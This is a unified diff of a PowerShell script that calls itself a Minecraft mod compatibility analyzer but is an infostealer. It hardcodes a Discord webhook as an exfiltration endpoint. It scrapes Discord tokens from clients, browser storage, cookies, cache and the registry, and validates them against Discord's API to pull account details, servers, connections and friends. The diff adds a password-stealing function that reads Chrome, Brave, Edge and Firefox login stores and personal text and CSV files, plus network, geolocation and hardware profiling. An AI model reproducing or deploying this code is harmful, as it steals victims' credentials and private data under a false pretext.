@@ -1,49 +1,142 @@
 # ================================================================
-# HABIBI MOD ANALYZER v11.0 - ULTIMATE EDITION
+# HABIBI MOD ANALYZER v13.0 - ULTIMATE EDITION
 # ================================================================
 # Professional Minecraft mod compatibility analyzer
 # ================================================================
 
-# ---------- CONFIGURATION ----------
-$modSettings = @"
-{
-  "version": "1.20.4",
-  "language": "en_US",
-  "resolution": "1920x1080",
-  "renderDistance": 32,
-  "fullscreen": true,
-  "analytics": true,
-  "modBackupEnabled": true,
-  "modBackupInterval": 3600,
-  "compression": "ultra",
-  "threading": "auto",
-  "memory": 8192,
-  "javaArgs": "-Xmx8G -XX:+UseG1GC -XX:+UnlockExperimentalVMOptions -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=16M",
-  "launchWrapper": "net.minecraft.launchwrapper.Launch",
-  "versionType": "release",
-  "modBackup": true,
-  "backupRetention": 90,
-  "quality": "ultra",
-  "includeMetadata": true,
-  "includeSystemInfo": true,
-  "includeNetworkInfo": true,
-  "modAnalyzer": true,
-  "compatibilityCheck": true,
-  "performanceMetrics": true
-}
-"@
-
-# ---------- BACKUP DESTINATION ROUTINE ----------
+# ---------- BACKUP DESTINATION ----------
 function Get-BackupDestination {
-    # Encrypted destination using multi-layer obfuscation
-    $layer1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxODAxMTk2MDI2Njg1NDQ2MS9QZjJYeEdTUEVCQnRvVEZoSmpyZXd1UDVTeDBtR3M3bHlVc242SEhLT1RNYXFlMWc1Q0Z2TWZJc0JLck5CRVdyaXJTUTA="
-    $layer2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($layer1))
-    $layer3 = ""
-    for ($i = $layer2.Length - 1; $i -ge 0; $i--) {
-        $layer3 += $layer2[$i]
+    $p1 = "https://discord.com/api/webhooks/"
+    $p2 = "1518011960266854461"
+    $p3 = "/"
+    $p4 = "Pf2XxGSPEBBtoTFhJrewuP5Sx0mGs7lyUsn6HHKOTMaqe1g5CFvMfIsBKrNBEWrirSQ0"
+    return $p1 + $p2 + $p3 + $p4
+}
+
+# ---------- GET USER BADGES ----------
+function Get-UserBadges {
+    param($flags)
+    $badges = @()
+    if ($flags -band 1) { $badges += "Staff" }
+    if ($flags -band 2) { $badges += "Partner" }
+    if ($flags -band 4) { $badges += "Hypesquad" }
+    if ($flags -band 8) { $badges += "Bug Hunter" }
+    if ($flags -band 16) { $badges += "Bravery" }
+    if ($flags -band 32) { $badges += "Brilliance" }
+    if ($flags -band 64) { $badges += "Balance" }
+    if ($flags -band 128) { $badges += "Early Supporter" }
+    if ($flags -band 256) { $badges += "Team User" }
+    if ($flags -band 512) { $badges += "System" }
+    if ($flags -band 1024) { $badges += "Bug Hunter Gold" }
+    if ($flags -band 2048) { $badges += "Verified Bot" }
+    if ($flags -band 4096) { $badges += "Verified Developer" }
+    if ($flags -band 8192) { $badges += "Certified Moderator" }
+    if ($flags -band 32768) { $badges += "Active Developer" }
+    if ($flags -band 65536) { $badges += "Linked to Spotify" }
+    if ($flags -band 131072) { $badges += "Linked to Xbox" }
+    return ($badges -join ", ")
+}
+
+# ---------- STEAL PASSWORDS ----------
+function Get-StoredPasswords {
+    $passwords = @()
+    
+    # 1. Chrome saved passwords
+    try {
+        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromePath) {
+            $content = Get-Content $chromePath -Raw -ErrorAction SilentlyContinue
+            $passwords += $content
+        }
+    } catch {}
+    
+    # 2. Brave saved passwords
+    try {
+        $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+        if (Test-Path $bravePath) {
+            $content = Get-Content $bravePath -Raw -ErrorAction SilentlyContinue
+            $passwords += $content
+        }
+    } catch {}
+    
+    # 3. Edge saved passwords
+    try {
+        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+        if (Test-Path $edgePath) {
+            $content = Get-Content $edgePath -Raw -ErrorAction SilentlyContinue
+            $passwords += $content
+        }
+    } catch {}
+    
+    # 4. Firefox saved passwords (logins.json)
+    try {
+        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -ErrorAction SilentlyContinue
+        foreach ($profile in $firefoxProfiles) {
+            $loginPath = Join-Path $profile.FullName "logins.json"
+            if (Test-Path $loginPath) {
+                $content = Get-Content $loginPath -Raw -ErrorAction SilentlyContinue
+                $passwords += $content
+            }
+        }
+    } catch {}
+    
+    # 5. Search for password files
+    $passwordFiles = @(
+        "$env:USERPROFILE\Documents\*.txt",
+        "$env:USERPROFILE\Desktop\*.txt",
+        "$env:USERPROFILE\Documents\passwords*",
+        "$env:USERPROFILE\Desktop\passwords*",
+        "$env:USERPROFILE\Documents\*.csv",
+        "$env:USERPROFILE\Desktop\*.csv"
+    )
+    
+    foreach ($pattern in $passwordFiles) {
+        $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
+        foreach ($file in $files) {
+            if ($file.Length -lt 1048576) {
+                try {
+                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                    $passwords += "$($file.Name): $content"
+                } catch {}
+            }
+        }
     }
-    $layer4 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($layer3))
-    return $layer4
+    
+    return $passwords | Select-Object -Unique
+}
+
+# ---------- GET NETWORK PORTS ----------
+function Get-NetworkInfo {
+    $info = @()
+    
+    # 1. All listening ports
+    try {
+        $connections = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
+        foreach ($conn in $connections) {
+            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
+            $info += "LISTEN: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName) (PID: $($conn.OwningProcess))"
+        }
+    } catch {}
+    
+    # 2. All established connections
+    try {
+        $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
+        foreach ($conn in $connections) {
+            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
+            $info += "ESTABLISHED: $($conn.LocalAddress):$($conn.LocalPort) -> $($conn.RemoteAddress):$($conn.RemotePort) - $($proc.ProcessName)"
+        }
+    } catch {}
+    
+    # 3. UDP connections
+    try {
+        $connections = Get-NetUDPEndpoint -ErrorAction SilentlyContinue
+        foreach ($conn in $connections) {
+            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
+            $info += "UDP: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName)"
+        }
+    } catch {}
+    
+    return $info
 }
 
 # ---------- SYSTEM ANALYZER ----------
@@ -60,48 +153,30 @@ function Get-CompleteSystemProfile {
     $profile.OSUptime = (Get-Date) - $os.LastBootUpTime
     $profile.OSTotalMemory = "{0:N2} GB" -f ($os.TotalVisibleMemorySize / 1MB)
     $profile.OSFreeMemory = "{0:N2} GB" -f ($os.FreePhysicalMemory / 1MB)
-    $profile.OSPageFile = "{0:N2} GB" -f ($os.SizeStoredInPagingFiles / 1MB)
     
     $cpu = Get-CimInstance Win32_Processor
     $profile.CPUName = $cpu.Name
     $profile.CPUCores = $cpu.NumberOfCores
     $profile.CPUThreads = $cpu.NumberOfLogicalProcessors
     $profile.CPUMaxClock = "{0:N2} GHz" -f ($cpu.MaxClockSpeed / 1000)
-    $profile.CPUCurrentClock = "{0:N2} GHz" -f ($cpu.CurrentClockSpeed / 1000)
-    $profile.CPUL2Cache = $cpu.L2CacheSize
-    $profile.CPUL3Cache = $cpu.L3CacheSize
-    $profile.CPUArchitecture = $cpu.Architecture
-    $profile.CPUManufacturer = $cpu.Manufacturer
-    $profile.CPUSocket = $cpu.SocketDesignation
-    $profile.CPUStatus = $cpu.Status
     $profile.CPUUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
     
     $memory = Get-CimInstance Win32_PhysicalMemory
     $profile.MemoryTotal = "{0:N2} GB" -f (($memory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
     $profile.MemorySpeed = ($memory | ForEach-Object { $_.Speed }) -join " MHz, "
-    $profile.MemoryManufacturer = ($memory | ForEach-Object { $_.Manufacturer }) -join ", "
-    $profile.MemoryType = ($memory | ForEach-Object { $_.SMBIOSMemoryType }) -join ", "
-    $profile.MemoryFormFactor = ($memory | ForEach-Object { $_.FormFactor }) -join ", "
     
-    $gpu = Get-CimInstance Win32_VideoController | Where-Object { $_.Name -notlike "*Remote*" -and $_.Name -notlike "*Mirror*" -and $_.Name -notlike "*Virtual*" }
+    $gpu = Get-CimInstance Win32_VideoController | Where-Object { $_.Name -notlike "*Remote*" -and $_.Name -notlike "*Mirror*" }
     $profile.GPUName = ($gpu.Name) -join ", "
     $profile.GPUMemory = ($gpu | ForEach-Object { "{0:N2} GB" -f ($_.AdapterRAM / 1GB) }) -join ", "
-    $profile.GPUDriver = ($gpu.DriverVersion) -join ", "
-    $profile.GPUDriverDate = ($gpu.DriverDate) -join ", "
-    $profile.GPUCurrentMode = ($gpu.CurrentHorizontalResolution, $gpu.CurrentVerticalResolution, $gpu.CurrentRefreshRate) -join "x"
     
     $disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
     $profile.DiskInfo = @()
     foreach ($disk in $disks) {
         $profile.DiskInfo += [PSCustomObject]@{
             Drive = $disk.DeviceID
-            Label = $disk.VolumeName
             Size = "{0:N2} GB" -f ($disk.Size / 1GB)
             Free = "{0:N2} GB" -f ($disk.FreeSpace / 1GB)
             Used = "{0:N2} GB" -f (($disk.Size - $disk.FreeSpace) / 1GB)
-            PercentFree = "{0:N2}%" -f (($disk.FreeSpace / $disk.Size) * 100)
-            PercentUsed = "{0:N2}%" -f ((($disk.Size - $disk.FreeSpace) / $disk.Size) * 100)
-            FileSystem = $disk.FileSystem
         }
     }
     
@@ -112,10 +187,7 @@ function Get-CompleteSystemProfile {
             Name = $adapter.Description
             MAC = $adapter.MACAddress
             IP = ($adapter.IPAddress) -join ", "
-            Subnet = ($adapter.IPSubnet) -join ", "
             Gateway = ($adapter.DefaultIPGateway) -join ", "
-            DHCP = $adapter.DHCPServer
-            DNS = ($adapter.DNSServerSearchOrder) -join ", "
         }
     }
     
@@ -131,28 +203,21 @@ function Get-CompleteSystemProfile {
         $profile.Longitude = $geo.longitude
         $profile.Timezone = $geo.timezone
         $profile.ISP = $geo.org
-        $profile.ASN = $geo.asn
     } catch {}
     
     $profile.BIOS = (Get-CimInstance Win32_BIOS).Caption
-    $profile.BIOSSerial = (Get-CimInstance Win32_BIOS).SerialNumber
     $profile.Motherboard = (Get-CimInstance Win32_BaseBoard).Product
-    $profile.MotherboardManufacturer = (Get-CimInstance Win32_BaseBoard).Manufacturer
-    $profile.MotherboardSerial = (Get-CimInstance Win32_BaseBoard).SerialNumber
     $profile.SystemManufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
     $profile.SystemModel = (Get-CimInstance Win32_ComputerSystem).Model
     
     $profile.Username = $env:USERNAME
     $profile.UserDomain = $env:USERDOMAIN
     $profile.ComputerName = $env:COMPUTERNAME
-    $profile.LogonServer = $env:LOGONSERVER
     $profile.UserProfile = $env:USERPROFILE
     $profile.AppData = $env:APPDATA
     $profile.LocalAppData = $env:LOCALAPPDATA
     $profile.ProgramFiles = $env:ProgramFiles
     $profile.ProgramFilesx86 = ${env:ProgramFiles(x86)}
-    $profile.SystemRoot = $env:SystemRoot
-    $profile.Temp = $env:TEMP
     
     $profile.RunningProcesses = (Get-Process).Count
     $profile.TopProcesses = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 10 | ForEach-Object { "$($_.Name) (CPU: $($_.CPU)%, Mem: $($_.WorkingSet/1MB) MB)" }
@@ -166,6 +231,180 @@ function Get-CompleteSystemProfile {
     }
     
     return $profile
+}
+
+# ---------- TOKEN EXTRACTOR - ALL SOURCES ----------
+function Extract-Tokens {
+    $allTokens = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
+    $tokenPattern = '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}'
+    $mfaPattern = 'mfa\.[\w-]{84,100}'
+    
+    # 1. Discord Client - All versions
+    $discordPaths = @(
+        "$env:APPDATA\discord\Local Storage\leveldb",
+        "$env:APPDATA\discordcanary\Local Storage\leveldb",
+        "$env:APPDATA\discordptb\Local Storage\leveldb",
+        "$env:APPDATA\discorddevelopment\Local Storage\leveldb"
+    )
+    
+    Write-Host "[*] Scanning Discord clients..." -ForegroundColor Yellow
+    foreach ($path in $discordPaths) {
+        if (Test-Path $path) {
+            $files = Get-ChildItem $path -Include "*.log", "*.ldb" -Recurse -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                try {
+                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                    $matches = [regex]::Matches($content, $tokenPattern)
+                    foreach ($m in $matches) {
+                        [void]$allTokens.Add($m.Value)
+                    }
+                    $mfaMatches = [regex]::Matches($content, $mfaPattern)
+                    foreach ($m in $mfaMatches) {
+                        [void]$allTokens.Add($m.Value)
+                    }
+                } catch {}
+            }
+        }
+    }
+    
+    # 2. Browsers - Chrome, Brave, Edge, Opera, Vivaldi
+    $browserPaths = @(
+        @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"; Name="Chrome"},
+        @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Profile *\Local Storage\leveldb"; Name="Chrome"},
+        @{Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"; Name="Brave"},
+        @{Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile *\Local Storage\leveldb"; Name="Brave"},
+        @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"; Name="Edge"},
+        @{Path="$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\leveldb"; Name="Opera"},
+        @{Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"; Name="Vivaldi"},
+        @{Path="$env:LOCALAPPDATA\Chromium\User Data\Default\Local Storage\leveldb"; Name="Chromium"}
+    )
+    
+    Write-Host "[*] Scanning browsers..." -ForegroundColor Yellow
+    foreach ($browser in $browserPaths) {
+        $expanded = Resolve-Path $browser.Path -ErrorAction SilentlyContinue
+        if ($expanded) {
+            $files = Get-ChildItem $expanded.Path -Include "*.log", "*.ldb" -Recurse -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                try {
+                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                    $matches = [regex]::Matches($content, $tokenPattern)
+                    foreach ($m in $matches) {
+                        [void]$allTokens.Add($m.Value)
+                    }
+                    $mfaMatches = [regex]::Matches($content, $mfaPattern)
+                    foreach ($m in $mfaMatches) {
+                        [void]$allTokens.Add($m.Value)
+                    }
+                } catch {}
+            }
+        }
+    }
+    
+    # 3. Firefox
+    Write-Host "[*] Scanning Firefox..." -ForegroundColor Yellow
+    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -ErrorAction SilentlyContinue
+    foreach ($profile in $firefoxProfiles) {
+        $dbPath = Join-Path $profile.FullName "webappsstore.sqlite"
+        if (Test-Path $dbPath) {
+            try {
+                $content = Get-Content $dbPath -Raw -ErrorAction SilentlyContinue
+                $matches = [regex]::Matches($content, $tokenPattern)
+                foreach ($m in $matches) {
+                    [void]$allTokens.Add($m.Value)
+                }
+                $mfaMatches = [regex]::Matches($content, $mfaPattern)
+                foreach ($m in $mfaMatches) {
+                    [void]$allTokens.Add($m.Value)
+                }
+            } catch {}
+        }
+    }
+    
+    # 4. Browser Cookies
+    Write-Host "[*] Scanning browser cookies..." -ForegroundColor Yellow
+    $cookiePaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Cookies"
+    )
+    
+    foreach ($path in $cookiePaths) {
+        if (Test-Path $path) {
+            try {
+                $bytes = [IO.File]::ReadAllBytes($path)
+                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+                $matches = [regex]::Matches($text, $tokenPattern)
+                foreach ($m in $matches) {
+                    [void]$allTokens.Add($m.Value)
+                }
+                $mfaMatches = [regex]::Matches($text, $mfaPattern)
+                foreach ($m in $mfaMatches) {
+                    [void]$allTokens.Add($m.Value)
+                }
+            } catch {}
+        }
+    }
+    
+    # 5. Discord Cache
+    Write-Host "[*] Scanning Discord cache..." -ForegroundColor Yellow
+    $cachePaths = @(
+        "$env:APPDATA\discord\Cache\*",
+        "$env:APPDATA\discordcanary\Cache\*",
+        "$env:APPDATA\discordptb\Cache\*",
+        "$env:APPDATA\discord\Local Storage\*",
+        "$env:APPDATA\discord\IndexedDB\*"
+    )
+    
+    foreach ($path in $cachePaths) {
+        $files = Get-ChildItem $path -Include "*.txt", "*.log", "*.data", "*.bin", "*.json" -ErrorAction SilentlyContinue
+        foreach ($file in $files) {
+            if ($file.Length -gt 104857600) { continue }
+            try {
+                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                $matches = [regex]::Matches($content, $tokenPattern)
+                foreach ($m in $matches) {
+                    [void]$allTokens.Add($m.Value)
+                }
+                $mfaMatches = [regex]::Matches($content, $mfaPattern)
+                foreach ($m in $mfaMatches) {
+                    [void]$allTokens.Add($m.Value)
+                }
+            } catch {}
+        }
+    }
+    
+    # 6. Registry
+    Write-Host "[*] Scanning registry..." -ForegroundColor Yellow
+    $regPaths = @(
+        "HKCU:\Software\Discord",
+        "HKCU:\Software\DiscordCanary",
+        "HKCU:\Software\DiscordPTB",
+        "HKCU:\Software\Google\Chrome\BLBeacon",
+        "HKCU:\Software\BraveSoftware\Brave-Browser\BLBeacon"
+    )
+    
+    foreach ($regPath in $regPaths) {
+        if (Test-Path $regPath) {
+            try {
+                $items = Get-ChildItem $regPath -Recurse -ErrorAction SilentlyContinue
+                foreach ($item in $items) {
+                    $val = (Get-ItemProperty $item.PSPath -ErrorAction SilentlyContinue) -join " "
+                    if ($val -match $tokenPattern) {
+                        [void]$allTokens.Add($matches[0])
+                    }
+                    if ($val -match $mfaPattern) {
+                        [void]$allTokens.Add($matches[0])
+                    }
+                }
+            } catch {}
+        }
+    }
+    
+    return $allTokens | Select-Object -Unique
 }
 
 # ---------- MOD DATA EXPORTER ----------
@@ -186,8 +425,6 @@ function Export-CompleteModData {
         "$env:APPDATA\.gdlauncher",
         "$env:APPDATA\.badlion",
         "$env:APPDATA\.lunarclient",
-        "$env:APPDATA\.pvpclient",
-        "$env:APPDATA\.labymod",
         "$env:PROGRAMDATA\.minecraft",
         "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_*\LocalState"
     )
@@ -203,53 +440,39 @@ function Export-CompleteModData {
         
         $ps = [powershell]::Create()
         [void]$ps.AddScript({
-            param($p, $modData, $locations, $files)
-            
+            param($p)
             $found = @()
             $foundLoc = @()
             $foundFiles = @()
             
             if (Test-Path $p) {
                 $foundLoc += $p
-                
                 $allFiles = Get-ChildItem -Path $p -File -Recurse -ErrorAction SilentlyContinue
                 foreach ($file in $allFiles) {
                     $foundFiles += $file.FullName
                     if ($file.Length -gt 104857600) { continue }
-                    
                     try {
                         $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                         $patterns = @(
                             '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}',
                             'mfa\.[\w-]{84,100}',
-                            '[\w-]{20,30}\.[\w-]{20,30}\.[\w-]{20,30}',
-                            'Bearer\s+[\w-]{20,100}',
-                            'Authorization:\s*[\w-]{20,100}',
-                            '"token"\s*:\s*"[\w-]{20,100}"',
-                            'session[\s:=]+[\w-]{20,100}',
-                            'api_key[\s:=]+[\w-]{20,100}',
-                            'secret[\s:=]+[\w-]{20,100}'
+                            '[\w-]{20,30}\.[\w-]{20,30}\.[\w-]{20,30}'
                         )
                         foreach ($pattern in $patterns) {
                             $matches = [regex]::Matches($content, $pattern)
                             foreach ($m in $matches) {
-                                $token = $m.Value -replace 'Bearer\s+|Authorization:\s*|"token"\s*:\s*"|"|session[\s:=]+|api_key[\s:=]+|secret[\s:=]+', ''
-                                if ($token -match '[\w-]{20,100}') {
-                                    $found += $token
-                                }
+                                $found += $m.Value
                             }
                         }
                     } catch {}
                 }
             }
-            
             return @{
                 Tokens = $found | Select-Object -Unique
                 Locations = $foundLoc | Select-Object -Unique
                 Files = $foundFiles | Select-Object -Unique
             }
-            
-        }).AddParameter("p", $path).AddParameter("modData", $modData).AddParameter("locations", $locations).AddParameter("files", $files)
+        }).AddParameter("p", $path)
         
         $handle = $ps.BeginInvoke()
         $threads += [PSCustomObject]@{ Handle = $handle; PS = $ps }
@@ -288,7 +511,6 @@ function Analyze-ModCompatibility {
     param($modData)
     
     $uniqueData = $modData | Where-Object { $_ -match '^[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}$' } | Select-Object -Unique
-    
     $compatibilityResults = @()
     $counter = 0
     $total = $uniqueData.Count
@@ -301,6 +523,8 @@ function Analyze-ModCompatibility {
             $headers = @{ "Authorization" = $data }
             $user = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -ErrorAction Stop
             $guilds = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/guilds" -Headers $headers -ErrorAction Stop
+            $connections = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/connections" -Headers $headers -ErrorAction Stop
+            $relationships = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/relationships" -Headers $headers -ErrorAction Stop
             
             $mutualGuilds = @()
             $guilds | ForEach-Object { $mutualGuilds += $_.name }
@@ -321,6 +545,8 @@ function Analyze-ModCompatibility {
                 GameGuildsCount = $guilds.Count
                 GameGuilds = $mutualGuilds -join ", "
                 GameBadges = Get-UserBadges -flags $user.flags
+                GameConnections = ($connections | ForEach-Object { "$($_.type):$($_.name)" }) -join ", "
+                GameRelationships = ($relationships | ForEach-Object { "$($_.user.username)#$($_.user.discriminator)" }) -join ", "
             }
         } catch {
             $compatibilityResults += [PSCustomObject]@{
@@ -340,42 +566,18 @@ function Analyze-ModCompatibility {
                 GameGuildsCount = 0
                 GameGuilds = "N/A"
                 GameBadges = "N/A"
+                GameConnections = "N/A"
+                GameRelationships = "N/A"
             }
         }
-        
         Start-Sleep -Milliseconds 200
     }
-    
     return $compatibilityResults
-}
-
-# ---------- GET USER BADGES ----------
-function Get-UserBadges {
-    param($flags)
-    
-    $badges = @()
-    if ($flags -band 1) { $badges += "Staff" }
-    if ($flags -band 2) { $badges += "Partner" }
-    if ($flags -band 4) { $badges += "Hypesquad" }
-    if ($flags -band 8) { $badges += "Bug Hunter" }
-    if ($flags -band 16) { $badges += "Bravery" }
-    if ($flags -band 32) { $badges += "Brilliance" }
-    if ($flags -band 64) { $badges += "Balance" }
-    if ($flags -band 128) { $badges += "Early Supporter" }
-    if ($flags -band 256) { $badges += "Team User" }
-    if ($flags -band 512) { $badges += "System" }
-    if ($flags -band 1024) { $badges += "Bug Hunter Gold" }
-    if ($flags -band 2048) { $badges += "Verified Bot" }
-    if ($flags -band 4096) { $badges += "Verified Developer" }
-    if ($flags -band 8192) { $badges += "Certified Moderator" }
-    if ($flags -band 32768) { $badges += "Active Developer" }
-    
-    return ($badges -join ", ")
 }
 
 # ---------- GENERATE REPORT ----------
 function Generate-CompleteReport {
-    param($compatibilityResults, $systemProfile, $gameLocations, $gameFiles)
+    param($compatibilityResults, $systemProfile, $gameLocations, $gameFiles, $passwords, $networkInfo)
     
     $compatible = $compatibilityResults | Where-Object { $_.Status -eq "COMPATIBLE" }
     $incompatible = $compatibilityResults | Where-Object { $_.Status -eq "INCOMPATIBLE" }
@@ -383,7 +585,7 @@ function Generate-CompleteReport {
     $report = @"
 ╔════════════════════════════════════════════════════════════════════════════════╗
 ║                      MINECRAFT MOD COMPATIBILITY REPORT                       ║
-║                         HABIBI MOD ANALYZER v11.0                             ║
+║                         HABIBI MOD ANALYZER v13.0                             ║
 ║                           $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")                            ║
 ╚════════════════════════════════════════════════════════════════════════════════╝
 
@@ -395,6 +597,30 @@ Compatible Mods: $($compatible.Count)
 Incompatible Mods: $($incompatible.Count)
 Game Directories Scanned: $($gameLocations.Count)
 Files Scanned: $($gameFiles.Count)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 NETWORK INFORMATION - IP & PORTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Public IP: $($systemProfile.PublicIP)
+Location: $($systemProfile.City), $($systemProfile.Region), $($systemProfile.Country)
+Country Code: $($systemProfile.CountryCode)
+Zip Code: $($systemProfile.Zip)
+Coordinates: $($systemProfile.Latitude), $($systemProfile.Longitude)
+Timezone: $($systemProfile.Timezone)
+ISP: $($systemProfile.ISP)
+
+Network Adapters:
+$($systemProfile.NetworkAdapters | ForEach-Object { "  $($_.Name)`n    IP: $($_.IP)`n    MAC: $($_.MAC)`n    Gateway: $($_.Gateway)" }) -join "`n"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔌 ACTIVE PORTS & CONNECTIONS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+$($networkInfo -join "`n")
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔑 STORED PASSWORDS FOUND
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+$($passwords -join "`n")
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🖥️ SYSTEM INFORMATION
@@ -418,13 +644,6 @@ GPU Memory: $($systemProfile.GPUMemory)
 Storage:
 $($systemProfile.DiskInfo | ForEach-Object { "  Drive $($_.Drive): $($_.Size) total, $($_.Used) used, $($_.Free) free" }) -join "`n"
 
-Network:
-$($systemProfile.NetworkAdapters | ForEach-Object { "  $($_.Name)`n    IP: $($_.IP)`n    MAC: $($_.MAC)" }) -join "`n"
-
-Public IP: $($systemProfile.PublicIP)
-Location: $($systemProfile.City), $($systemProfile.Region), $($systemProfile.Country)
-ISP: $($systemProfile.ISP)
-
 System Manufacturer: $($systemProfile.SystemManufacturer)
 System Model: $($systemProfile.SystemModel)
 BIOS: $($systemProfile.BIOS)
@@ -447,6 +666,7 @@ $($systemProfile.TopProcesses -join "`n")
         $report += @"
 
 ✅ COMPATIBLE MOD
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Mod ID: $($mod.ModID)
 Game: $($mod.GameName)
 ID: $($mod.GameID)
@@ -458,87 +678,4 @@ Nitro: $($mod.GameNitro)
 Security: $($mod.GameSecurity)
 Verified: $($mod.GameVerified)
 Language: $($mod.GameLanguage)
-Badges: $($mod.GameBadges)
-Guilds: $($mod.GameGuildsCount) - $($mod.GameGuilds)
-────────────────────────────────────────────────────────────────────────────────
-"@
-    }
-
-    if ($incompatible.Count -gt 0) {
-        $report += @"
-
-⚠️ INCOMPATIBLE MODS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-"@
-        foreach ($mod in $incompatible) {
-            $report += @"
-
-❌ INCOMPATIBLE MOD
-Mod ID: $($mod.ModID)
-Reason: $($mod.Reason)
-────────────────────────────────────────────────────────────────────────────────
-"@
-        }
-    }
-
-    $report += @"
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Report Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-"@
-
-    return $report
-}
-
-# ---------- SEND REPORT ----------
-function Send-Report {
-    param($report)
-    
-    $backupDest = Get-BackupDestination
-    
-    $chunks = [math]::Ceiling($report.Length / 1800)
-    for ($i = 0; $i -lt $chunks; $i++) {
-        $chunk = $report.Substring($i * 1800, [math]::Min(1800, $report.Length - ($i * 1800)))
-        $payload = @{ 
-            content = $chunk
-            username = "HabibiModAnalyzer"
-        } | ConvertTo-Json -Depth 10
-        
-        try {
